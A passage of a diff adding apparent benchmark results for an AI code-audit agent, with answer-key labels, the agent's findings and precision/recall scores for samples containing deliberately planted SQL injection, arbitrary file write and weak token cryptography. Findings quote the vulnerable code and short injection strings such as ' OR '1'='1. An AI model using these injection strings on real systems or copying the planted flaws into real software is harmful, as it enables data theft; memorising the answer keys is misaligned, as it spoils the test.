+              "spurious": 3,
+              "missed": 2,
+              "duplicates": 0
+            },
+            "1": {
+              "precision": 0.4,
+              "recall": 0.5,
+              "f1": 0.444,
+              "spurious": 3,
+              "missed": 2,
+              "duplicates": 0
+            },
+            "2": {
+              "precision": 0.6,
+              "recall": 0.75,
+              "f1": 0.667,
+              "spurious": 2,
+              "missed": 1,
+              "duplicates": 0
+            },
+            "3": {
+              "precision": 1.0,
+              "recall": 0.75,
+              "f1": 0.857,
+              "spurious": 0,
+              "missed": 1,
+              "duplicates": 2
+            },
+            "4": {
+              "precision": 1.0,
+              "recall": 0.75,
+              "f1": 0.857,
+              "spurious": 0,
+              "missed": 1,
+              "duplicates": 2
+            },
+            "6": {
+              "precision": 1.0,
+              "recall": 0.75,
+              "f1": 0.857,
+              "spurious": 0,
+              "missed": 1,
+              "duplicates": 2
+            },
+            "8": {
+              "precision": 1.0,
+              "recall": 0.75,
+              "f1": 0.857,
+              "spurious": 0,
+              "missed": 1,
+              "duplicates": 2
+            }
+          }
+        }
+      ]
+    },
+    {
+      "sample": "s7-crossfile-flow",
+      "tier": "L7 专家",
+      "style": "定位型（只给位置，不给缺陷描述）",
+      "goal": "审查 app/repository.py 里的 query 与 export 两个方法。",
+      "audit_root": "examples\\s7-crossfile-flow\\repo",
+      "labels": [
+        {
+          "code": "FLOW001-a",
+          "file": "app/repository.py",
+          "line": 12,
+          "description": "tenant/kind 源自 HTTP 查询参数，经 service 透传至此拼进 SQL"
+        },
+        {
+          "code": "FLOW002-a",
+          "file": "app/repository.py",
+          "line": 19,
+          "description": "表名同样来自请求参数，且无法参数化，必须走白名单校验"
+        }
+      ],
+      "rule": {
+        "findings": 2,
+        "recall": 1.0,
+        "precision": 1.0,
+        "f1": 1.0,
+        "found": [
+          "FLOW001-a@ app/repository.py:12",
+          "FLOW002-a@ app/repository.py:18"
+        ]
+      },
+      "runs": [
+        {
+          "run": 1,
+          "elapsed": 39.5,
+          "iterations": 7,
+          "stop_reason": "finished",
+          "summary": "审查范围为 app/repository.py 的 query 与 export 两个方法，并借助 app/service.py、app/handler.py 追踪了完整调用链（数据入口是 HTTP 请求参数/请求体）。用 grep 验证了连接释放路径确实缺失。工作区 diff 仅涉及 backend/eval 评测集布局，与目标文件无关，未纳入。\n\n共记录 5 条发现：3 个 blocker —— query 的 tenant/kind 字符串拼接导致 SQL 注入与跨租户越权读取（repository.py:12）；export 的 table 无白名单校验导致表名注入（L18）；export 的 path 由调用方任意指定导致任意文件写入/覆盖（L17）。2 个 warn —— export 恒返回 0 使上层 rows 永远为 0（L20）；sqlite 连接创建后无任何关闭点、每请求新建实例造成 fd 泄漏（L8）。\n\n未记录的疑点：query 的 fetchall() 全量载入内存缺乏数据量证据，export 中途失败残留半截文件影响有限，均未达到发现标准。没有实际运行代码或测试来复现注入与文件写入，结论基于静态阅读，注入与文件写入的可利用性依赖于该服务是否直接暴露给不可信输入（handler.py 显示参数正是来自 request）。",
+          "warnings": [],
+          "usage": {
+            "prompt": 47503,
+            "completion": 5875,
+            "cached": 40832
+          },
+          "cache_hit": 0.86,
+          "findings": [
+            {
+              "file": "app/repository.py",
+              "line": 12,
+              "severity": "blocker",
+              "title": "query 用字符串拼接 tenant/kind，存在 SQL 注入与跨租户数据泄漏",
+              "detail": "SQL 由 `\"SELECT * FROM reports WHERE tenant = '\" + tenant + \"' AND kind = '\" + kind + \"'\"` 拼接而成，tenant/kind 未做任何转义或参数化。两者都直接来自 HTTP 查询参数（app/handler.py:8-9 `request.args.get`），因此外部可控。传入 tenant=`' OR '1'='1`、kind=`' OR '1'='1` 会让 WHERE 恒真，返回所有租户的全部报表，破坏多租户隔离；也可用 `' UNION SELECT ...` 之类读取其他表。sqlite3 的 execute 虽然只执行单条语句，挡不住这种注入。",
+              "evidence": "app/repository.py:12  sql = \"SELECT * FROM reports WHERE tenant = '\" + tenant + \"' AND kind = '\" + kind + \"'\"  ；app/repository.py:13  return self.conn.execute(sql).fetchall()  ；调用链 app/handler.py:8-10 tenant/kind 取自 request.args 后传入 ReportService().build()"
+            },
+            {
+              "file": "app/repository.py",
+              "line": 18,
+              "severity": "blocker",
+              "title": "export 直接把 table 拼进 SQL，表名可被注入",
+              "detail": "`self.conn.execute(\"SELECT * FROM \" + table)` 未对 table 做白名单校验，table 来自 POST 请求体（app/handler.py:15 `request.json.get(\"table\", \"\")` → service.py:16）。攻击者可用 `reports WHERE 1=1 UNION SELECT ...` 之类的表名片段读取任意表内容并写入导出文件，绕过 query 上的租户过滤。表名虽然不能参数化，但必须用白名单或对 sqlite_master 中的表名做存在性校验。",
+              "evidence": "app/repository.py:18  for row in self.conn.execute(\"SELECT * FROM \" + table):  ；app/handler.py:15 table = request.json.get(\"table\", \"\")  ；app/service.py:16 rows = self.repo.export(table=table, path=path)"
+            },
+            {
+              "file": "app/repository.py",
+              "line": 17,
+              "severity": "blocker",
+              "title": "export 的 path 完全由请求方指定，构成任意文件写入",
+              "detail": "`open(path, \"w\", encoding=\"utf-8\")` 中的 path 未做任何限制或归一化，直接来自请求体（app/handler.py:16 `request.json.get(\"path\", \"/tmp/export.txt\")`）。调用 `/report/export` 的客户端可以让服务进程以自身权限覆盖任意可写文件（例如覆盖配置、日志或应用源码），且写入内容是 `str(row)` 形式的数据库内容，可能造成数据外泄到任意路径。触发条件仅是调用该接口并自行指定 path，无需其他前置条件。",
+              "evidence": "app/repository.py:17  with open(path, \"w\", encoding=\"utf-8\") as handle:  ；app/handler.py:16 path = request.json.get(\"path\", \"/tmp/export.txt\")  ；app/handler.py:17 return ReportService().dump(table=table, path=path)"
+            },
+            {
+              "file": "app/repository.py",
+              "line": 20,
+              "severity": "warn",
+              "title": "export 返回值恒为 0，上层因此永远上报 rows=0",
+              "detail": "docstring 声明「把整表导出到指定路径」，返回类型为 int，但函数体从未统计行数，L20 无条件 `return 0`。上层 app/service.py:16-17 把这个返回值当作行数放进响应 `{\"rows\": rows, \"path\": path}`，所以无论导出了 0 行还是 10 万行，接口都返回 rows=0，调用方据此判断导出结果会得到错误结论。触发条件是任意一次正常导出，属于必现的逻辑错误。",
+              "evidence": "app/repository.py:18-20  for row in self.conn.execute(...): handle.write(str(row) + \"\\n\") / return 0 ；app/service.py:16-17  rows = self.repo.export(...) ; return {\"rows\": rows, \"path\": path}"
+            },
+            {
+              "file": "app/repository.py",
+              "line": 8,
+              "severity": "warn",
+              "title": "连接只在 __init__ 创建，query/export 均无释放路径",
+              "detail": "__init__ 里 `sqlite3.connect(\"reporting.db\")` 建立连接，但整个仓库（app/ 三个文件）没有任何 `close()`、`with` 上下文或 `__del__`，grep `close|__enter__` 零命中。handler.py:10 与 handler.py:17 每次请求都新建 `ReportService()`→`Repository()`，随即被丢弃，于是每次 query/export 调用都泄漏一个 sqlite 连接（含文件描述符），高频访问下会耗尽 fd 并报 \"unable to open database file\"。触发条件是持续调用这两个接口，属于会累积的真实资源泄漏，只是不如前三个缺陷紧急。",
+              "evidence": "app/repository.py:8 self.conn = sqlite3.connect(\"reporting.db\")；app/repository.py:13、18 直接使用 self.conn 无关闭；grep 'close|__enter__|with sqlite3|commit' 在 app/ 下无匹配；app/handler.py:10/17 每请求新建 ReportService()"
+            }
+          ],
+          "matched": 2,
+          "missed": [],
+          "missed_detail": [],
+          "spurious": [
+            {
+              "file": "app/repository.py",
+              "line": 8,
+              "severity": "warn",
+              "title": "连接只在 __init__ 创建，query/export 均无释放路径",
+              "detail": "__init__ 里 `sqlite3.connect(\"reporting.db\")` 建立连接，但整个仓库（app/ 三个文件）没有任何 `close()`、`with` 上下文或 `__del__`，grep `close|__enter__` 零命中。handler.py:10 与 handler.py:17 每次请求都新建 `ReportService()`→`Repository()`，随即被丢弃，于是每次 query/export 调用都泄漏一个 sqlite 连接（含文件描述符），高频访问下会耗尽 fd 并报 \"unable to open database file\"。触发条件是持续调用这两个接口，属于会累积的真实资源泄漏，只是不如前三个缺陷紧急。",
+              "evidence": "app/repository.py:8 self.conn = sqlite3.connect(\"reporting.db\")；app/repository.py:13、18 直接使用 self.conn 无关闭；grep 'close|__enter__|with sqlite3|commit' 在 app/ 下无匹配；app/handler.py:10/17 每请求新建 ReportService()"
+            }
+          ],
+          "spurious_detail": [
+            {
+              "probe": {
+                "file": "app/repository.py",
+                "line": 8,
+                "severity": "warn",
+                "title": "连接只在 __init__ 创建，query/export 均无释放路径",
+                "detail": "__init__ 里 `sqlite3.connect(\"reporting.db\")` 建立连接，但整个仓库（app/ 三个文件）没有任何 `close()`、`with` 上下文或 `__del__`，grep `close|__enter__` 零命中。handler.py:10 与 handler.py:17 每次请求都新建 `ReportService()`→`Repository()`，随即被丢弃，于是每次 query/export 调用都泄漏一个 sqlite 连接（含文件描述符），高频访问下会耗尽 fd 并报 \"unable to open database file\"。触发条件是持续调用这两个接口，属于会累积的真实资源泄漏，只是不如前三个缺陷紧急。",
+                "evidence": "app/repository.py:8 self.conn = sqlite3.connect(\"reporting.db\")；app/repository.py:13、18 直接使用 self.conn 无关闭；grep 'close|__enter__|with sqlite3|commit' 在 app/ 下无匹配；app/handler.py:10/17 每请求新建 ReportService()"
+              },
+              "nearest_label": {
+                "code": "FLOW001-a",
+                "file": "app/repository.py",
+                "line": 12
+              },
+              "distance": 4,
+              "in_same_file": true
+            }
+          ],
+          "duplicates": [
+            {
+              "file": "app/repository.py",
+              "line": 17,
+              "severity": "blocker",
+              "title": "export 的 path 完全由请求方指定，构成任意文件写入",
+              "detail": "`open(path, \"w\", encoding=\"utf-8\")` 中的 path 未做任何限制或归一化，直接来自请求体（app/handler.py:16 `request.json.get(\"path\", \"/tmp/export.txt\")`）。调用 `/report/export` 的客户端可以让服务进程以自身权限覆盖任意可写文件（例如覆盖配置、日志或应用源码），且写入内容是 `str(row)` 形式的数据库内容，可能造成数据外泄到任意路径。触发条件仅是调用该接口并自行指定 path，无需其他前置条件。",
+              "evidence": "app/repository.py:17  with open(path, \"w\", encoding=\"utf-8\") as handle:  ；app/handler.py:16 path = request.json.get(\"path\", \"/tmp/export.txt\")  ；app/handler.py:17 return ReportService().dump(table=table, path=path)"
+            },
+            {
+              "file": "app/repository.py",
+              "line": 20,
+              "severity": "warn",
+              "title": "export 返回值恒为 0，上层因此永远上报 rows=0",
+              "detail": "docstring 声明「把整表导出到指定路径」，返回类型为 int，但函数体从未统计行数，L20 无条件 `return 0`。上层 app/service.py:16-17 把这个返回值当作行数放进响应 `{\"rows\": rows, \"path\": path}`，所以无论导出了 0 行还是 10 万行，接口都返回 rows=0，调用方据此判断导出结果会得到错误结论。触发条件是任意一次正常导出，属于必现的逻辑错误。",
+              "evidence": "app/repository.py:18-20  for row in self.conn.execute(...): handle.write(str(row) + \"\\n\") / return 0 ；app/service.py:16-17  rows = self.repo.export(...) ; return {\"rows\": rows, \"path\": path}"
+            }
+          ],
+          "precision": 0.667,
+          "recall": 1.0,
+          "f1": 0.8,
+          "tolerance_curve": {
+            "0": {
+              "precision": 0.2,
+              "recall": 0.5,
+              "f1": 0.286,
+              "spurious": 4,
+              "missed": 1,
+              "duplicates": 0
+            },
+            "1": {
+              "precision": 0.5,
+              "recall": 1.0,
+              "f1": 0.667,
+              "spurious": 2,
+              "missed": 0,
+              "duplicates": 1
+            },
+            "2": {
+              "precision": 0.667,
+              "recall": 1.0,
+              "f1": 0.8,
+              "spurious": 1,
+              "missed": 0,
+              "duplicates": 2
+            },
+            "3": {
+              "precision": 0.667,
+              "recall": 1.0,
+              "f1": 0.8,
+              "spurious": 1,
+              "missed": 0,
+              "duplicates": 2
+            },
+            "4": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 3
+            },
+            "6": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 3
+            },
+            "8": {
+              "precision": 1.0,
+              "recall": 1.0,
+              "f1": 1.0,
+              "spurious": 0,
+              "missed": 0,
+              "duplicates": 3
+            }
+          }
+        }
+      ]
+    },
+    {
+      "sample": "s8-crypto-protocol",
+      "tier": "L8 专家",
+      "style": "诊断型（先立安全目标）",
+      "goal": "先说明这套令牌方案应当达成的安全目标（不可预测、不可伪造、不可重放、机密性），再逐项判断实现是否达成。",
+      "audit_root": "examples\\s8-crypto-protocol\\repo",
+      "labels": [
+        {
+          "code": "CRYPTO01-a",
+          "file": "app/tokens.py",
+          "line": 7,
+          "description": "签名密钥硬编码，且是低熵的固定字符串"
+        },
+        {
+          "code": "CRYPTO02-a",
+          "file": "app/tokens.py",
+          "line": 12,
+          "description": "Mersenne Twister 可预测，观测若干输出即可推后续值"
+        },
+        {
+          "code": "CRYPTO03-a",
+          "file": "app/tokens.py",
+          "line": 18,
+          "description": "MD5 已被攻破且此处未加盐，可构造碰撞"
+        },
+        {
+          "code": "CRYPTO04-a",
+          "file": "app/tokens.py",
+          "line": 26,
+          "description": "字符串比较非常量时间（可做时序侧信道），且完全没用 public_key，等于不验签"
+        },
+        {
+          "code": "CRYPTO05-a",
+          "file": "app/tokens.py",
+          "line": 34,
+          "description": "固定密钥流异或，相同明文恒定得到相同密文（确定性），且长度小于 32 字节时密钥流被复用"
+        }
+      ],
+      "rule": {
+        "findings": 1,
+        "recall": 0.2,
+        "precision": 1.0,
+        "f1": 0.333,
+        "found": [
+          "CRYPTO01-a@ app/tokens.py:7"
+        ]
+      },
+      "runs": [
+        {
+          "run": 1,
+          "elapsed": 91.4,
+          "iterations": 8,
+          "stop_reason": "finished",
+          "summary": "## 审计范围\n\n工作区只有一个文件 `app/tokens.py`（34 行），已逐行读完；另用 grep 对整个工作区检索了 `SIGNING_SECRET / sign( / verify( / encrypt_field / new_session_id`，确认这些符号除本文件外没有其他调用点。`run_command` 被高风险权限策略拦截（工具返回 HighRiskBlocked），因此本次结论均为静态阅读所得，凡涉及「上层如何消费」的部分我都显式标注为未验证。仓库根不是 git 仓库，`git diff` 返回的是无关的 backend/eval 变更，与本次审计目标无关，已排除。\n\n## 四个安全目标的达成情况：全部未达成\n\n**1. 不可预测 —— 未达成（blocker）**\n`new_session_id()`（L12）用 `random.randint` 生成会话标识。random 是 MT19937，不是 CSPRNG，状态可由少量输出还原；取值空间也仅约 2^53。攻击者拿到几次会话标识即可预测他人的 ID。应改 `secrets.token_urlsafe(32)`。\n\n**2. 不可伪造 —— 未达成（blocker）**\n这是最严重的一条。`sign()`（L18）的「签名」是 `md5(body)`，**没有任何密钥参与**；L7 定义的 `SI",
+          "warnings": [
+            "运行中发生 2 次工具失败：\n- run_command: HighRiskBlocked - `run_command` 属于高风险工具，当前运行未开启高风险权限。\n- run_command: HighRiskBlocked - `run_command` 属于高风险工具，当前运行未开启高风险权限。",
+            "有 2 次工具调用被护栏拒绝。"
+          ],
+          "usage": {
+            "prompt": 99447,
+            "completion": 13366,
+            "cached": 81664
+          },
+          "cache_hit": 0.821,
+          "findings": [
+            {
+              "file": "app/tokens.py",
+              "line": 18,
+              "severity": "blocker",
+              "title": "签名是无密钥的裸 MD5，任何人都能伪造合法令牌（不可伪造性失效）",
+              "detail": "`sign()` 里签名的计算是 `hashlib.md5(body.encode())`，完全没有任何密钥参与；文件顶部定义的 `SIGNING_SECRET`（L7）在全文件中从未被引用。因此\"签名\"只是载荷的公开哈希：任何拿到令牌的人都可自行构造 body 并用同样算法算出 digest，拼成 `body.digest` 即可通过校验。验证侧同样无密钥：`verify(token, public_key)`（L22）签名要求传入 `public_key`，但函数体（L24-26）只做 md5 重算，`public_key` 参数从未被使用，所以调用方以为在做非对称/带密钥校验，实际上校验对攻击者完全透明。此外 MD5 本身已不具备抗碰撞性，即便将来补上密钥，`md5(secret + body)` 这类拼接也不是安全的 MAC，必须用 HMAC-SHA256 或 Ed25519 等签",
+              "evidence": "L7 `SIGNING_SECRET = \"token-secret-2026\"`（grep 全仓库仅此一处出现，无任何引用）；L18 `digest = hashlib.md5(body.encode()).hexdigest()` 中无 secret/HMAC；L22 `def verify(token: str, public_key: str) -> bool:` 与 L25 `recomputed = hashlib.md5(body.encode()).hexdigest()` —— `public_key` 在函数体内未被使用。"
+            },
+            {
+              "file": "app/tokens.py",
+              "line": 12,
+              "severity": "blocker",
+              "title": "会话 ID 用非密码学随机数 random 生成，可被预测（不可预测性失效）",
+              "detail": "`random.randint(10**15, 10**16 - 1)` 使用的是 Mersenne Twister（MT19937），属于统计用伪随机数发生器，不是 CSPRNG：其内部状态可由少量连续输出完整还原（状态 624 个 32 位字），之后所有历史与未来的输出都可被推算。同时取值空间只有 9×10^15 ≈ 2^53 个可能值，远低于会话标识应具备的熵（对无速率限制的在线猜测也不够）。触发条件：会话标识若被用作会话认证凭据（这是本函数名与模块用途所暗示的），攻击者先取得任意几次会话标识即可预测他人的 ID，从而接管会话。注意：当前工作区内除本文件外没有其他调用点（grep 无结果），所以影响面取决于上层如何消费该 ID，这一点无法在本仓库内进一步验证。",
+              "evidence": "L10-12：\n```\ndef new_session_id() -> str:\n    \"\"\"生成会话标识。\"\"\"\n    return str(random.randint(10**15, 10**16 - 1))\n```\nL5 `import random`（未导入 secrets）。"
+            },
+            {
+              "file": "app/tokens.py",
+              "line": 31,
+              "severity": "blocker",
+              "title": "encrypt_field 用固定 32 字节密钥流做异或，无 IV 且重复使用密钥流，机密性不成立",
+              "detail": "`stream = hashlib.sha256(key).digest()` 把密钥确定性派生为一段 32 字节的密钥流，随后 L33 用 `stream[index % len(stream)]` 循环异或明文。由此产生三个确定的问题：(1) 密钥流可复用且无 nonce/IV —— 同一 key 下相同明文永远得到相同密文（确定性加密，等价于 ECB），密文本身即成为明文的指纹；(2) 密钥流只对 (key, 位置) 敏感，与明文无关，因此两个密文的异或等于两个明文的异或，已知明文可即时解出同位置的未知明文；(3) 超过 32 字节的字段会回到起点重复密钥流，长字段的异或差分同样泄露明文；(4) 这是纯异或流密码且无认证标签，密文可被逐位篡改而不会被察觉。函数名与\"加密\"语义（docstring 写\"混淆\"）会让调用方以为敏感字段受到了保护。触发条件：只要该函数被用于真实敏感字段（这",
+              "evidence": "L29-34：\n```\ndef encrypt_field(value: str, key: bytes) -> bytes:\n    \"\"\"对敏感字段做混淆。\"\"\"\n    stream = hashlib.sha256(key).digest()\n    return bytes(\n        byte ^ stream[index % len(stream)] for index, byte in enumerate(value.encode())\n    )\n```\n`index % len(stream)` 明确揭示了密钥流的循环复用，且全程没有任何 nonce/IV/随机盐参数"
+            },
+            {
+              "file": "app/tokens.py",
+              "line": 15,
+              "severity": "warn",
+              "title": "令牌不含时效与一次性标识，verify 也无法拒绝过期令牌，重放防护缺失",
+              "detail": "令牌格式是 `body + \".\" + digest`（L17-19），body 只是调用方传入的 payload；`sign()` 不注入任何签发时间、过期时间或一次性标识（jti/nonce）。验证侧 `verify()` 的返回类型是 bool（L22），函数体只做摘要比对（L25-26），既不解析 payload 里的声明，也没有任何时间参数或「已使用标识」存储的入口——也就是说，即使调用方在 payload 里自带了 exp，本模块自身也永远不会因为令牌过期而拒绝它。只要令牌被第三方捕获（典型途径：日志、Referer/URL 泄露、传输未加密、被攻破的存储），它可以被无限期原样重放。定级说明：模块层面重放防护完全缺失，但\"是否可重放\"最终取决于上层是否额外自行解析 body 并校验时效，而当前工作区内除本文件外没有任何调用点（grep `sign(`/`verify(` 仅命中",
+              "evidence": "L17-19 `body = json.dumps(payload, sort_keys=True)` / `digest = hashlib.md5(body.encode()).hexdigest()` / `return body + \".\" + digest` —— 令牌中不含 exp/nonce 字段；L22-26 `def verify(token: str, public_key: str) -> bool:` … `return digest == recomputed` —— 无时间或一次性校验逻辑，也无状态存储。"
+            },
+            {
+              "file": "app/tokens.py",
+              "line": 24,
+              "severity": "warn",
+              "title": "签名按首个 '.' 切分，payload 含 '.' 时合法令牌会被自身 verify 拒绝",
+              "detail": "`sign()` 用 `body + \".\" + digest` 拼接，而 `verify()` 用 `token.partition(\".\")` 按**第一个** '.' 切分：只要 body 里出现 '.'，校验时得到的 body 就会被截断，重算的摘要必然与原摘要不同，于是 sign() 自己签发的合法令牌会被 verify() 拒绝。触发条件是 payload 的任意字符串值或浮点数字里含 '.'，例如 `sign({\"email\": \"a.b@x.com\"})` 生成的令牌 verify 恒为 False（`json.dumps` 不会转义字符串中的 '.'）。这不是安全性问题而是可用性/自相矛盾问题：签发端与校验端对同一令牌的解析不一致，任何带域名、版本号（\"v1.2\"）、URL、小数的字段都会导致认证失败，且失败原因是静默返回 False，排查成本高。",
+              "evidence": "L19 `return body + \".\" + digest`（body 未做任何转义/编码）；L24 `body, _, digest = token.partition(\".\")` —— 以首个 '.' 为界，body 内出现 '.' 即被截断。例：payload={\"v\": \"1.0\"} → body='{\"v\": \"1.0\"}'，partition 得 body='{\"v\": \"1'，L25 重算的摘要与原 digest 不等，verify 返回 False。"
+            },
+            {
+              "file": "app/tokens.py",
+              "line": 26,
+              "severity": "note",
+              "title": "摘要比对使用非常量时间的 ==，修复密钥化 MAC 后会成为侧信道",
+              "detail": "L26 用 Python 的 `==` 比较两个十六进制摘要字符串，其比较过程在首个不相等字符处提前返回，耗时与「匹配前缀长度」相关，理论上可按字节爆破摘要。重要限定：在当前实现下这条并不构成可利用漏洞，因为摘要计算不含密钥（见 L18 的发现），攻击者本来就能直接算出正确摘要；本条是修复 L18 之后必须一并处理的加固项——一旦换成 `hmac.compare_digest`（常量时间）以外的带密钥校验，`==` 的提前返回就会成为唯一的侧信道。因此按 note 记录，不夸大其当前影响。",
+              "evidence": "L26 `return digest == recomputed` —— 字符串 `==` 比较在 Python 中按字符逐位比较并在首个不等处返回，非常量时间；对比 `hmac.compare_digest` 的常量时间语义。"
+            }
+          ],
+          "matched": 3,
+          "missed": [
+            "CRYPTO01-a app/tokens.py:7",
+            "CRYPTO05-a app/tokens.py:34"
+          ],
+          "missed_detail": [
+            {
+              "code": "CRYPTO01-a",
+              "file": "app/tokens.py",
+              "line": 7,
+              "description": "签名密钥硬编码，且是低熵的固定字符串",
+              "nearest_prediction": {
+                "file": "app/tokens.py",
+                "line": 12,
+                "severity": "blocker",
+                "title": "会话 ID 用非密码学随机数 random 生成，可被预测（不可预测性失效）",
+                "detail": "`random.randint(10**15, 10**16 - 1)` 使用的是 Mersenne Twister（MT19937），属于统计用伪随机数发生器，不是 CSPRNG：其内部状态可由少量连续输出完整还原（状态 624 个 32 位字），之后所有历史与未来的输出都可被推算。同时取值空间只有 9×10^15 ≈ 2^53 个可能值，远低于会话标识应具备的熵（对无速率限制的在线猜测也不够）。触发条件：会话标识若被用作会话认证凭据（这是本函数名与模块用途所暗示的），攻击者先取得任意几次会话标识即可预测他人的 ID，从而接管会话。注意：当前工作区内除本文件外没有其他调用点（grep 无结果），所以影响面取决于上层如何消费该 ID，这一点无法在本仓库内进一步验证。",
+                "evidence": "L10-12：\n```\ndef new_session_id() -> str:\n    \"\"\"生成会话标识。\"\"\"\n    return str(random.randint(10**15, 10**16 - 1))\n```\nL5 `import random`（未导入 secrets）。"
+              },
+              "distance": 5
+            },
+            {
+              "code": "CRYPTO05-a",
+              "file": "app/tokens.py",
+              "line": 34,
+              "description": "固定密钥流异或，相同明文恒定得到相同密文（确定性），且长度小于 32 字节时密钥流被复用",
+              "nearest_prediction": {
+                "file": "app/tokens.py",
+                "line": 31,
+                "severity": "blocker",
+                "title": "encrypt_field 用固定 32 字节密钥流做异或，无 IV 且重复使用密钥流，机密性不成立",
+                "detail": "`stream = hashlib.sha256(key).digest()` 把密钥确定性派生为一段 32 字节的密钥流，随后 L33 用 `stream[index % len(stream)]` 循环异或明文。由此产生三个确定的问题：(1) 密钥流可复用且无 nonce/IV —— 同一 key 下相同明文永远得到相同密文（确定性加密，等价于 ECB），密文本身即成为明文的指纹；(2) 密钥流只对 (key, 位置) 敏感，与明文无关，因此两个密文的异或等于两个明文的异或，已知明文可即时解出同位置的未知明文；(3) 超过 32 字节的字段会回到起点重复密钥流，长字段的异或差分同样泄露明文；(4) 这是纯异或流密码且无认证标签，密文可被逐位篡改而不会被察觉。函数名与\"加密\"语义（docstring 写\"混淆\"）会让调用方以为敏感字段受到了保护。触发条件：只要该函数被用于真实敏感字段（这",
+                "evidence": "L29-34：\n```\ndef encrypt_field(value: str, key: bytes) -> bytes:\n    \"\"\"对敏感字段做混淆。\"\"\"\n    stream = hashlib.sha256(key).digest()\n    return bytes(\n        byte ^ stream[index % len(stream)] for index, byte in enumerate(value.encode())\n    )\n```\n`index % len(stream)` 明确揭示了密钥流的循环复用，且全程没有任何 nonce/IV/随机盐参数"
+              },
+              "distance": 3
+            }
+          ],
+          "spurious": [
+            {
+              "file": "app/tokens.py",
+              "line": 31,
+              "severity": "blocker",
+              "title": "encrypt_field 用固定 32 字节密钥流做异或，无 IV 且重复使用密钥流，机密性不成立",
+              "detail": "`stream = hashlib.sha256(key).digest()` 把密钥确定性派生为一段 32 字节的密钥流，随后 L33 用 `stream[index % len(stream)]` 循环异或明文。由此产生三个确定的问题：(1) 密钥流可复用且无 nonce/IV —— 同一 key 下相同明文永远得到相同密文（确定性加密，等价于 ECB），密文本身即成为明文的指纹；(2) 密钥流只对 (key, 位置) 敏感，与明文无关，因此两个密文的异或等于两个明文的异或，已知明文可即时解出同位置的未知明文；(3) 超过 32 字节的字段会回到起点重复密钥流，长字段的异或差分同样泄露明文；(4) 这是纯异或流密码且无认证标签，密文可被逐位篡改而不会被察觉。函数名与\"加密\"语义（docstring 写\"混淆\"）会让调用方以为敏感字段受到了保护。触发条件：只要该函数被用于真实敏感字段（这",
+              "evidence": "L29-34：\n```\ndef encrypt_field(value: str, key: bytes) -> bytes:\n    \"\"\"对敏感字段做混淆。\"\"\"\n    stream = hashlib.sha256(key).digest()\n    return bytes(\n        byte ^ stream[index % len(stream)] for index, byte in enumerate(value.encode())\n    )\n```\n`index % len(stream)` 明确揭示了密钥流的循环复用，且全程没有任何 nonce/IV/随机盐参数"
+            },
+            {
+              "file": "app/tokens.py",
+              "line": 15,
+              "severity": "warn",
+              "title": "令牌不含时效与一次性标识，verify 也无法拒绝过期令牌，重放防护缺失",
+              "detail": "令牌格式是 `body + \".\" + digest`（L17-19），body 只是调用方传入的 payload；`sign()` 不注入任何签发时间、过期时间或一次性标识（jti/nonce）。验证侧 `verify()` 的返回类型是 bool（L22），函数体只做摘要比对（L25-26），既不解析 payload 里的声明，也没有任何时间参数或「已使用标识」存储的入口——也就是说，即使调用方在 payload 里自带了 exp，本模块自身也永远不会因为令牌过期而拒绝它。只要令牌被第三方捕获（典型途径：日志、Referer/URL 泄露、传输未加密、被攻破的存储），它可以被无限期原样重放。定级说明：模块层面重放防护完全缺失，但\"是否可重放\"最终取决于上层是否额外自行解析 body 并校验时效，而当前工作区内除本文件外没有任何调用点（grep `sign(`/`verify(` 仅命中",
+              "evidence": "L17-19 `body = json.dumps(payload, sort_keys=True)` / `digest = hashlib.md5(body.encode()).hexdigest()` / `return body + \".\" + digest` —— 令牌中不含 exp/nonce 字段；L22-26 `def verify(token: str, public_key: str) -> bool:` … `return digest == recomputed` —— 无时间或一次性校验逻辑，也无状态存储。"
+            }
+          ],
+          "spurious_detail": [
+            {
+              "probe": {
+                "file": "app/tokens.py",
+                "line": 31,
+                "severity": "blocker",
+                "title": "encrypt_field 用固定 32 字节密钥流做异或，无 IV 且重复使用密钥流，机密性不成立",
+                "detail": "`stream = hashlib.sha256(key).digest()` 把密钥确定性派生为一段 32 字节的密钥流，随后 L33 用 `stream[index % len(stream)]` 循环异或明文。由此产生三个确定的问题：(1) 密钥流可复用且无 nonce/IV —— 同一 key 下相同明文永远得到相同密文（确定性加密，等价于 ECB），密文本身即成为明文的指纹；(2) 密钥流只对 (key, 位置) 敏感，与明文无关，因此两个密文的异或等于两个明文的异或，已知明文可即时解出同位置的未知明文；(3) 超过 32 字节的字段会回到起点重复密钥流，长字段的异或差分同样泄露明文；(4) 这是纯异或流密码且无认证标签，密文可被逐位篡改而不会被察觉。函数名与\"加密\"语义（docstring 写\"混淆\"）会让调用方以为敏感字段受到了保护。触发条件：只要该函数被用于真实敏感字段（这",
+                "evidence": "L29-34：\n```\ndef encrypt_field(value: str, key: bytes) -> bytes:\n    \"\"\"对敏感字段做混淆。\"\"\"\n    stream = hashlib.sha256(key).digest()\n    return bytes(\n        byte ^ stream[index % len(stream)] for index, byte in enumerate(value.encode())\n    )\n```\n`index % len(stream)` 明确揭示了密钥流的循环复用，且全程没有任何 nonce/IV/随机盐参数"
+              },
+              "nearest_label": {
+                "code": "CRYPTO05-a",
+                "file": "app/tokens.py",
+                "line": 34
+              },
+              "distance": 3,
+              "in_same_file": true
+            },
+            {
+              "probe": {
+                "file": "app/tokens.py",
+                "line": 15,
+                "severity": "warn",
+                "title": "令牌不含时效与一次性标识，verify 也无法拒绝过期令牌，重放防护缺失",
+                "detail": "令牌格式是 `body + \".\" + digest`（L17-19），body 只是调用方传入的 payload；`sign()` 不注入任何签发时间、过期时间或一次性标识（jti/nonce）。验证侧 `verify()` 的返回类型是 bool（L22），函数体只做摘要比对（L25-26），既不解析 payload 里的声明，也没有任何时间参数或「已使用标识」存储的入口——也就是说，即使调用方在 payload 里自带了 exp，本模块自身也永远不会因为令牌过期而拒绝它。只要令牌被第三方捕获（典型途径：日志、Referer/URL 泄露、传输未加密、被攻破的存储），它可以被无限期原样重放。定级说明：模块层面重放防护完全缺失，但\"是否可重放\"最终取决于上层是否额外自行解析 body 并校验时效，而当前工作区内除本文件外没有任何调用点（grep `sign(`/`verify(` 仅命中",
